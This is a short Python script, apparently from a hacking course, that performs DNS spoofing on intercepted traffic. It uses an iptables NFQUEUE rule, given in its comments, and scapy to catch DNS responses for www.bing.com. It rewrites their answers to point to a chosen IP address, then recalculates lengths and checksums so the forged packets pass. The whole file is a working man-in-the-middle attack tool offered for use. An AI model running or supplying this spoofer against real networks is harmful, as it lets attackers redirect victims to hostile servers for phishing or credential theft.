#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

# You must run first "sudo iptables -I FORWARD -j NFQUEUE --queue-num 0"
# When you finish return the iptables to its original state "sudo iptables --flush"


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())  # We converted it to scapy to allow us to access it's layers as the normal DNS packet is only string not layers
    if scapy_packet.haslayer(scapy.DNSRR):  # DNSRR stands for DNS Resource Record which is a DNS response
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com".encode() in qname:
            print('[+] Spoofing target')
            website = "192.169.1.111"
            answer = scapy.DNSRR(rrname=qname, rdata=website)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len  # We remove them and scapy will automatically calculate them while sending the new packet containing the modified answers
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))  # We returned it using string to return it to its original state
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

